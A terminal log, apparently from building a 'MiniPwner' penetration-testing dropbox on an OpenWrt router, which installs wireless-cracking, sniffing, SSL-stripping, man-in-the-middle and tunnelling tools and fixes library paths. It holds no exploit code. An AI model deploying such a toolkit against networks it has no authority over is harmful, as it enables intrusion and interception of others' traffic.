+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/kmod-fs-ext4_3.3.8-1_ar71xx.ipk.
+Installing kmod-lib-crc16 (3.3.8-1) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/kmod-lib-crc16_3.3.8-1_ar71xx.ipk.
+Configuring kmod-lib-crc16.
+Configuring kmod-fs-ext4.
+root@OpenWrt:/usr/share/minipwner# opkg install block-mount
+Installing block-mount (0.2.0-9) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/block-mount_0.2.0-9_ar71xx.ipk.
+Installing blkid (2.21.2-1) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/blkid_2.21.2-1_ar71xx.ipk.
+Installing libblkid (2.21.2-1) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/libblkid_2.21.2-1_ar71xx.ipk.
+Installing libuuid (2.21.2-1) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/libuuid_2.21.2-1_ar71xx.ipk.
+Installing swap-utils (2.21.2-1) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/swap-utils_2.21.2-1_ar71xx.ipk.
+Configuring libuuid.
+Configuring libblkid.
+Configuring blkid.
+Configuring swap-utils.
+Configuring block-mount.
+root@OpenWrt:/usr/share/minipwner# cp -f profile.1 /etc/profile
+root@OpenWrt:/usr/share/minipwner# cp -f fstab.1 /etc/config/fstab
+root@OpenWrt:/usr/share/minipwner# cp -f opkg.conf.1 /etc/opkg.conf
+root@OpenWrt:/usr/share/minipwner# cp -f system.1 /etc/config/system
+root@OpenWrt:/usr/share/minipwner# mkdir /mnt/usb
+root@OpenWrt:/usr/share/minipwner# /etc/init.d/fstab enable
+root@OpenWrt:/usr/share/minipwner# /etc/init.d/fstab start
+root@OpenWrt:/usr/share/minipwner# ls /mnt/usb
+lost+found
+root@OpenWrt:/usr/share/minipwner# df
+Filesystem           1K-blocks      Used Available Use% Mounted on
+rootfs                    1088       656       432  60% /
+/dev/root                 2048      2048         0 100% /rom
+tmpfs                    14608       388     14220   3% /tmp
+tmpfs                      512         0       512   0% /dev
+/dev/mtdblock3            1088       656       432  60% /overlay
+overlayfs:/overlay        1088       656       432  60% /
+/dev/sda2             14564248    346936  13486640   3% /mnt/usb
+root@OpenWrt:/usr/share/minipwner# cd /usr/share/minipwner
+root@OpenWrt:/usr/share/minipwner# ln -s /mnt/usb /opt
+root@OpenWrt:/usr/share/minipwner# ln -s /etc /mnt/usb/etc
+root@OpenWrt:/usr/share/minipwner# opkg update
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/Packages.gz.
+Updated list of available packages in /var/opkg-lists/snapshots.
+root@OpenWrt:/usr/share/minipwner# opkg install netcat
+Installing netcat (0.7.1-2) to root...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/netcat_0.7.1-2_ar71xx.ipk.
+Configuring netcat.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install tar
+Installing tar (1.23-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/tar_1.23-1_ar71xx.ipk.
+Installing bzip2 (1.0.6-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/bzip2_1.0.6-1_ar71xx.ipk.
+Installing libbz2 (1.0.6-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libbz2_1.0.6-1_ar71xx.ipk.
+Configuring libbz2.
+Configuring bzip2.
+Configuring tar.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install openssh-sftp-client
+Installing openssh-sftp-client (6.6p1-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/openssh-sftp-client_6.6p1-1_ar71xx.ipk.
+Installing libopenssl (1.0.1g-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libopenssl_1.0.1g-1_ar71xx.ipk.
+Installing zlib (1.2.8-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/zlib_1.2.8-1_ar71xx.ipk.
+Configuring zlib.
+Configuring libopenssl.
+Configuring openssh-sftp-client.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install nmap
+Installing nmap (6.40-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/nmap_6.40-1_ar71xx.ipk.
+Installing libpcap (1.5.3-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libpcap_1.5.3-1_ar71xx.ipk.
+Installing libstdcpp (4.8-linaro-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libstdcpp_4.8-linaro-1_ar71xx.ipk.
+Configuring libpcap.
+Configuring libstdcpp.
+Configuring nmap.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install tcpdump
+Installing tcpdump (4.5.1-4) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/tcpdump_4.5.1-4_ar71xx.ipk.
+Configuring tcpdump.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install aircrack-ng
+Installing aircrack-ng (1.1-3) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/aircrack-ng_1.1-3_ar71xx.ipk.
+Multiple packages (libgcc and libgcc) providing same name marked HOLD or PREFER. Using latest.
+Installing libpthread (0.9.33.2-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libpthread_0.9.33.2-1_ar71xx.ipk.
+Configuring libpthread.
+Configuring aircrack-ng.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install airpwn
+Installing airpwn (1.3-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/airpwn_1.3-1_ar71xx.ipk.
+Installing libnet1 (1.1.6-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libnet1_1.1.6-1_ar71xx.ipk.
+Installing libpcre (8.11-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libpcre_8.11-2_ar71xx.ipk.
+Configuring libnet1.
+Configuring libpcre.
+Configuring airpwn.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install kismet-client
+Installing kismet-client (2010-07-R1-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/kismet-client_2010-07-R1-2_ar71xx.ipk.
+Installing uclibcxx (0.2.4-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/uclibcxx_0.2.4-1_ar71xx.ipk.
+Installing libnl (3.2.21-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libnl_3.2.21-1_ar71xx.ipk.
+Installing libncurses (5.9-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libncurses_5.9-1_ar71xx.ipk.
+Installing terminfo (5.9-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/terminfo_5.9-1_ar71xx.ipk.
+Configuring terminfo.
+Configuring uclibcxx.
+Configuring libnl.
+Configuring libncurses.
+Configuring kismet-client.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install kismet-server
+Installing kismet-server (2010-07-R1-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/kismet-server_2010-07-R1-2_ar71xx.ipk.
+Installing libcap (2.22-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libcap_2.22-1_ar71xx.ipk.
+Configuring libcap.
+Configuring kismet-server.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install vim
+Installing vim (7.3-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/vim_7.3-1_ar71xx.ipk.
+Configuring vim.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install perl
+Installing perl (5.10.0-7) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/perl_5.10.0-7_ar71xx.ipk.
+Configuring perl.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install curl
+Installing curl (7.36.0-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/curl_7.36.0-1_ar71xx.ipk.
+Installing libcurl (7.36.0-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libcurl_7.36.0-1_ar71xx.ipk.
+Installing libpolarssl (1.3.4-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libpolarssl_1.3.4-1_ar71xx.ipk.
+Configuring libpolarssl.
+Configuring libcurl.
+Configuring curl.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install openvpn
+Unknown package 'openvpn'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package openvpn.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install dsniff
+Installing dsniff (2.4b1-3) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/dsniff_2.4b1-3_ar71xx.ipk.
+Installing libnids (1.24-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libnids_1.24-1_ar71xx.ipk.
+Installing libnet0 (1.0.2a-9) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libnet0_1.0.2a-9_ar71xx.ipk.
+Installing libgdbm (1.10-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libgdbm_1.10-1_ar71xx.ipk.
+Installing librpc (0.9.32-rc2-0a2179bbc0844928f2a0ec01dba93d9b5d6d41a7) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/librpc_0.9.32-rc2-0a2179bbc0844928f2a0ec01dba93d9b5d6d41a7_ar71xx.ipk.
+Configuring libnet0.
+Configuring librpc.
+Configuring libnids.
+Configuring libgdbm.
+Configuring dsniff.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install nbtscan
+Installing nbtscan (1.5.1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/nbtscan_1.5.1_ar71xx.ipk.
+Configuring nbtscan.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install reaver
+Installing reaver (r113-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/reaver_r113-1_ar71xx.ipk.
+Installing libsqlite3 (3071201-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libsqlite3_3071201-1_ar71xx.ipk.
+Configuring libsqlite3.
+Configuring reaver.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install snort
+Installing snort (2.9.2.2-3) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/snort_2.9.2.2-3_ar71xx.ipk.
+Installing libdnet (1.11-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libdnet_1.11-2_ar71xx.ipk.
+Installing libdaq (1.1.1-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libdaq_1.1.1-1_ar71xx.ipk.
+Configuring libdnet.
+Configuring libdaq.
+Configuring snort.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install sws
+Unknown package 'sws'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package sws.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install sed
+Installing sed (4.2.1-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/sed_4.2.1-1_ar71xx.ipk.
+Configuring sed.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install karma
+Installing karma (20060124-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/karma_20060124-1_ar71xx.ipk.
+Collected errors:
+ * satisfy_dependencies_for: Cannot satisfy the following dependencies for karma:
+ * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 
+ * opkg_install_cmd: Cannot install package karma.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install samba36-client
+Installing samba36-client (3.6.23-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/samba36-client_3.6.23-1_ar71xx.ipk.
+Installing libreadline (6.2-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libreadline_6.2-1_ar71xx.ipk.
+Configuring libreadline.
+Configuring samba36-client.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install elinks
+Installing elinks (0.11.7-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/elinks_0.11.7-1_ar71xx.ipk.
+Configuring elinks.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install yafc
+Installing yafc (1.1.1-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/yafc_1.1.1-2_ar71xx.ipk.
+Configuring yafc.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install sslstrip
+Installing sslstrip (0.9-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/sslstrip_0.9-1_ar71xx.ipk.
+Installing python (2.7.3-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/python_2.7.3-2_ar71xx.ipk.
+Installing libffi (3.0.11-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libffi_3.0.11-1_ar71xx.ipk.
+Installing python-mini (2.7.3-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/python-mini_2.7.3-2_ar71xx.ipk.
+Installing twisted (2.5.0-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/twisted_2.5.0-1_ar71xx.ipk.
+Installing zope-interface (2.5.0-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/zope-interface_2.5.0-1_ar71xx.ipk.
+Installing twisted-web (2.5.0-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/twisted-web_2.5.0-1_ar71xx.ipk.
+Installing pyopenssl (0.10-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/pyopenssl_0.10-1_ar71xx.ipk.
+Configuring python-mini.
+Configuring zope-interface.
+Configuring twisted.
+Configuring twisted-web.
+Configuring libffi.
+Configuring python.
+Configuring pyopenssl.
+Configuring sslstrip.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install sshtunnel
+Installing sshtunnel (3-3) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/sshtunnel_3-3_ar71xx.ipk.
+Installing openssh-client (6.6p1-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/openssh-client_6.6p1-1_ar71xx.ipk.
+Configuring openssh-client.
+Configuring sshtunnel.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install diff
+Unknown package 'diff'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package diff.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install openssl
+Unknown package 'openssl'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package openssl.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install ptunnel
+Installing ptunnel (0.71-4) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/ptunnel_0.71-4_ar71xx.ipk.
+Configuring ptunnel.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install openssl-util\
+> 
+> 
+> 
+
+Installing openssl-util (1.0.1g-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/openssl-util_1.0.1g-1_ar71xx.ipk.
+Configuring openssl-util.
+root@OpenWrt:/usr/share/minipwner# 
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install dhcpcd
+Installing dhcpcd (6.1.0-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/dhcpcd_6.1.0-1_ar71xx.ipk.
+Installing librt (0.9.33.2-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/librt_0.9.33.2-1_ar71xx.ipk.
+Configuring librt.
+Configuring dhcpcd.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install cryptsetup-openssl
+Installing cryptsetup-openssl (1.6.2-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/cryptsetup-openssl_1.6.2-1_ar71xx.ipk.
+Multiple packages (kmod-crypto-core and kmod-crypto-core) providing same name marked HOLD or PREFER. Using latest.
+Multiple packages (kmod-crypto-core and kmod-crypto-core) providing same name marked HOLD or PREFER. Using latest.
+Multiple packages (kmod-crypto-core and kmod-crypto-core) providing same name marked HOLD or PREFER. Using latest.
+Collected errors:
+ * satisfy_dependencies_for: Cannot satisfy the following dependencies for cryptsetup-openssl:
+ * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 
+ * opkg_install_cmd: Cannot install package cryptsetup-openssl.
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install cryptsetup
+Installing cryptsetup (1.6.2-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/cryptsetup_1.6.2-1_ar71xx.ipk.
+Multiple packages (kmod-crypto-core and kmod-crypto-core) providing same name marked HOLD or PREFER. Using latest.
+Multiple packages (kmod-crypto-core and kmod-crypto-core) providing same name marked HOLD or PREFER. Using latest.
+Multiple packages (kmod-crypto-core and kmod-crypto-core) providing same name marked HOLD or PREFER. Using latest.
+Collected errors:
+ * satisfy_dependencies_for: Cannot satisfy the following dependencies for cryptsetup:
+ * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 	kernel (= 3.10.36-1-6548302841f6df0132fbc6960fa209fb) * 
+ * opkg_install_cmd: Cannot install package cryptsetup.
+root@OpenWrt:/usr/share/minipwner# date
+Sat May 10 01:32:25 UTC 2014
+root@OpenWrt:/usr/share/minipwner# ln -s /mnt/usb/usr/share/nmap /usr/share/nmap
+root@OpenWrt:/usr/share/minipwner# opkg -dest usb install ettercap
+Installing ettercap (NG-0.7.3-2) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/ettercap_NG-0.7.3-2_ar71xx.ipk.
+Installing libltdl (2.4-1) to usb...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/libltdl_2.4-1_ar71xx.ipk.
+Configuring libltdl.
+Configuring ettercap.
+root@OpenWrt:/usr/share/minipwner# kismet
+-ash: kismet: not found
+root@OpenWrt:/usr/share/minipwner# nmap
+-ash: nmap: not found
+root@OpenWrt:/usr/share/minipwner# cd /mnt/usb/usr/share/
+root@OpenWrt:/mnt/usb/usr/share# ls
+ettercap  nmap      sslstrip  terminfo  vim
+root@OpenWrt:/mnt/usb/usr/share# cd ..
+root@OpenWrt:/mnt/usb/usr# ls
+bin      include  lib      sbin     share
+root@OpenWrt:/mnt/usb/usr# cd sbin/
+root@OpenWrt:/mnt/usb/usr/sbin# ls
+airbase-ng              dsniff                  sshow
+airdriver-ng            easside-ng              tcpdump
+aireplay-ng             filesnarf               tcpkill
+airmon-ng               macof                   tcpnice
+airodump-ng             mailsnarf               tkiptun-ng
+airodump-ng-oui-update  msgsnarf                urlsnarf
+airserv-ng              nbtscan                 webmitm
+airtun-ng               nmblookup               wesside-ng
+arpspoof                ptunnel                 yafc
+dnet                    smbclient
+dnsspoof                sshmitm
+root@OpenWrt:/mnt/usb/usr/sbin# cd ..
+root@OpenWrt:/mnt/usb/usr# ls
+bin      include  lib      sbin     share
+root@OpenWrt:/mnt/usb/usr# cd bin/
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         etterfilter         packetforge-ng      snort.bin
+airdecap-ng         etterlog            perl                ssh
+airdecloak-ng       ivstools            perl5.10.0          sshtunnel.sh
+airpwn              kismet_client       python              sslstrip
+buddy-ng            kismet_server       python2.7           tar
+bzip2               kstats              reaver              twistd
+curl                makeivs-ng          scp                 u2boat
+daq-modules-config  mktap               sed                 u2spewfoo
+elinks              nmap                sftp                vim
+ettercap            openssl             snort               wash
+root@OpenWrt:/mnt/usb/usr/bin# ./kismet_client 
+./kismet_client: can't load library 'libuClibc++.so.0'
+root@OpenWrt:/mnt/usb/usr/bin# cd ../lib/
+root@OpenWrt:/mnt/usb/usr/lib# ls
+daq                         libnl-3.so.200.16.1
+dnsspoof.hosts              libnl-genl-3.so.200
+dsniff.magic                libnl-genl-3.so.200.16.1
+dsniff.services             libnl-nf-3.so.200
+ettercap                    libnl-nf-3.so.200.16.1
+libbz2.so.1.0               libnl-route-3.so.200
+libbz2.so.1.0.6             libnl-route-3.so.200.16.1
+libcap.so                   liborcon-1.0.0.so
+libcap.so.2                 liborcon.so
+libcap.so.2.22              libpanel.so
+libcrypto.so.1.0.0          libpanel.so.5
+libcurl.so.4                libpanel.so.5.9
+libcurl.so.4.3.0            libpcap.so
+libcurses.so                libpcap.so.1.3
+libdaq.so                   libpcap.so.1.3.0
+libdaq.so.1                 libpcre.so.0
+libdaq.so.1.0.0             libpcre.so.0.0.1
+libdnet.so.1                libpcreposix.so.0
+libdnet.so.1.0.1            libpcreposix.so.0.0.0
+libffi.so.6                 libpolarssl.so
+libffi.so.6.0.0             libpolarssl.so.1.3.4
+libform.so                  libpolarssl.so.5
+libform.so.5                libreadline.so
+libform.so.5.9              libreadline.so.6
+libgdbm.so.4                libreadline.so.6.2
+libgdbm.so.4.0.0            libsfbpf.so
+libhistory.so               libsfbpf.so.0
+libhistory.so.6             libsfbpf.so.0.0.1
+libhistory.so.6.2           libsqlite3.so.0
+libltdl.so.7                libsqlite3.so.0.8.6
+libltdl.so.7.3.0            libssl.so.1.0.0
+libmenu.so                  libstdc++.so.6
+libmenu.so.5                libstdc++.so.6.0.19
+libmenu.so.5.9              libstdc++.so.6.0.19-gdb.py
+libncurses.so               libuClibc++-0.2.4.so
+libncurses.so.5             libuClibc++.so.0
+libncurses.so.5.9           libz.so
+libnet.so.0                 libz.so.1
+libnet.so.0.0.0             libz.so.1.2.8
+libnet.so.1                 opkg
+libnet.so.1.3.0             python2.7
+libnids.so.1.24             snort_dynamicengine
+libnl-3.so.200              snort_dynamicpreprocessor
+root@OpenWrt:/mnt/usb/usr/lib# export LD_LIBRARY_PATH=/mnt/usb/usr/lib
+root@OpenWrt:/mnt/usb/usr/lib# ./kismet_client 
+-ash: ./kismet_client: not found
+root@OpenWrt:/mnt/usb/usr/lib# cd ../bin/
+root@OpenWrt:/mnt/usb/usr/bin# ./kismet_client 
+Error opening terminal: xterm.
+root@OpenWrt:/mnt/usb/usr/bin# ./kismet_client 
+Error opening terminal: xterm.
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         daq-modules-config  kismet_server       perl                sftp                twistd
+airdecap-ng         elinks              kstats              perl5.10.0          snort               u2boat
+airdecloak-ng       ettercap            makeivs-ng          python              snort.bin           u2spewfoo
+airpwn              etterfilter         mktap               python2.7           ssh                 vim
+buddy-ng            etterlog            nmap                reaver              sshtunnel.sh        wash
+bzip2               ivstools            openssl             scp                 sslstrip
+curl                kismet_client       packetforge-ng      sed                 tar
+root@OpenWrt:/mnt/usb/usr/bin# ./airpwn
+./airpwn: can't load library 'libpthread.so.0'
+root@OpenWrt:/mnt/usb/usr/bin# cd /usr/lib
+root@OpenWrt:/usr/lib# ls
+iptables             libip4tc.so.0        libjson.so.0.0.1     libuuid.so.1.3.0     lua
+libblkid.so.1        libip4tc.so.0.0.0    liblua.so.5.1.4      libxtables.so        opkg
+libblkid.so.1.1.0    libiwinfo.so         libnl-tiny.so        libxtables.so.5      pppd
+libip4tc.so          libjson.so.0         libuuid.so.1         libxtables.so.5.0.0
+root@OpenWrt:/usr/lib# 
+root@OpenWrt:/usr/lib# 
+root@OpenWrt:/usr/lib# 
+root@OpenWrt:/usr/lib# cd /mnt/usb/usr/bin
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         daq-modules-config  kismet_server       perl                sftp                twistd
+airdecap-ng         elinks              kstats              perl5.10.0          snort               u2boat
+airdecloak-ng       ettercap            makeivs-ng          python              snort.bin           u2spewfoo
+airpwn              etterfilter         mktap               python2.7           ssh                 vim
+buddy-ng            etterlog            nmap                reaver              sshtunnel.sh        wash
+bzip2               ivstools            openssl             scp                 sslstrip
+curl                kismet_client       packetforge-ng      sed                 tar
+root@OpenWrt:/mnt/usb/usr/bin# ./aircrack-ng 
+./aircrack-ng: can't load library 'libpthread.so.0'
+root@OpenWrt:/mnt/usb/usr/bin# cd /lib
+root@OpenWrt:/lib# ls
+ar71xx.sh              functions.sh           libcrypt.so.0          libuClibc-0.9.33.2.so  lua                    uci
+config                 ld-uClibc-0.9.33.2.so  libdl-0.9.33.2.so      libubox.so             modules                upgrade
+firewall               ld-uClibc.so.0         libdl.so.0             libubus.so             netifd                 wifi
+firmware               libblobmsg_json.so     libgcc_s.so.1          libuci.so              network
+firstboot              libc.so.0              libm-0.9.33.2.so       libutil-0.9.33.2.so    preinit
+functions              libcrypt-0.9.33.2.so   libm.so.0              libutil.so.0           uboot-envtools.sh
+root@OpenWrt:/lib# find
+.
+./ar71xx.sh
+./config
+./config/uci.sh
+./firewall
+./firewall/config.sh
+./firewall/core.sh
+./firewall/core_forwarding.sh
+./firewall/core_init.sh
+./firewall/core_interface.sh
+./firewall/core_redirect.sh
+./firewall/core_rule.sh
+./firewall/fw.sh
+./firewall/uci_firewall.sh
+./firmware
+./firstboot
+./firstboot/05_firstboot_skip
+./firstboot/10_determine_parts
+./firstboot/10_no_fo_clear_overlay
+./firstboot/10_reset_has_mini_fo
+./firstboot/20_has_mini_fo
+./firstboot/20_no_fo_mount_jffs
+./firstboot/20_reset_clear_jffs
+./firstboot/30_is_rootfs_mounted
+./firstboot/30_no_fo_pivot
+./firstboot/30_reset_copy_rom
+./firstboot/40_copy_ramoverlay
+./firstboot/40_no_fo_copy_ramoverlay
+./firstboot/50_pivot
+./firstboot/99_10_no_fo_cleanup
+./firstboot/99_10_with_fo_cleanup
+./functions
+./functions/boot.sh
+./functions/network.sh
+./functions/service.sh
+./functions/uci-defaults.sh
+./functions/fsck
+./functions/block.sh
+./functions/fsck.sh
+./functions/mount.sh
+./functions/extmount.sh
+./functions.sh
+./ld-uClibc-0.9.33.2.so
+./ld-uClibc.so.0
+./libblobmsg_json.so
+./libc.so.0
+./libcrypt-0.9.33.2.so
+./libcrypt.so.0
+./libdl-0.9.33.2.so
+./libdl.so.0
+./libgcc_s.so.1
+./libm-0.9.33.2.so
+./libm.so.0
+./libuClibc-0.9.33.2.so
+./libubox.so
+./libubus.so
+./libuci.so
+./libutil-0.9.33.2.so
+./libutil.so.0
+./lua
+./lua/ubus.so
+./modules
+./modules/3.3.8
+./modules/3.3.8/aes_generic.ko
+./modules/3.3.8/arc4.ko
+./modules/3.3.8/ath.ko
+./modules/3.3.8/ath79_wdt.ko
+./modules/3.3.8/ath9k.ko
+./modules/3.3.8/ath9k_common.ko
+./modules/3.3.8/ath9k_hw.ko
+./modules/3.3.8/cfg80211.ko
+./modules/3.3.8/compat.ko
+./modules/3.3.8/crc-ccitt.ko
+./modules/3.3.8/crypto_algapi.ko
+./modules/3.3.8/ehci-hcd.ko
+./modules/3.3.8/gpio-button-hotplug.ko
+./modules/3.3.8/ip_tables.ko
+./modules/3.3.8/ipt_LOG.ko
+./modules/3.3.8/ipt_MASQUERADE.ko
+./modules/3.3.8/ipt_REJECT.ko
+./modules/3.3.8/iptable_filter.ko
+./modules/3.3.8/iptable_mangle.ko
+./modules/3.3.8/iptable_nat.ko
+./modules/3.3.8/iptable_raw.ko
+./modules/3.3.8/leds-gpio.ko
+./modules/3.3.8/ledtrig-default-on.ko
+./modules/3.3.8/ledtrig-netdev.ko
+./modules/3.3.8/ledtrig-timer.ko
+./modules/3.3.8/ledtrig-usbdev.ko
+./modules/3.3.8/mac80211.ko
+./modules/3.3.8/nf_conntrack.ko
+./modules/3.3.8/nf_conntrack_ftp.ko
+./modules/3.3.8/nf_conntrack_ipv4.ko
+./modules/3.3.8/nf_conntrack_irc.ko
+./modules/3.3.8/nf_defrag_ipv4.ko
+./modules/3.3.8/nf_nat.ko
+./modules/3.3.8/nf_nat_ftp.ko
+./modules/3.3.8/nf_nat_irc.ko
+./modules/3.3.8/nls_base.ko
+./modules/3.3.8/ohci-hcd.ko
+./modules/3.3.8/ppp_async.ko
+./modules/3.3.8/ppp_generic.ko
+./modules/3.3.8/pppoe.ko
+./modules/3.3.8/pppox.ko
+./modules/3.3.8/slhc.ko
+./modules/3.3.8/usb-common.ko
+./modules/3.3.8/usbcore.ko
+./modules/3.3.8/x_tables.ko
+./modules/3.3.8/xt_CT.ko
+./modules/3.3.8/xt_NOTRACK.ko
+./modules/3.3.8/xt_TCPMSS.ko
+./modules/3.3.8/xt_comment.ko
+./modules/3.3.8/xt_conntrack.ko
+./modules/3.3.8/xt_limit.ko
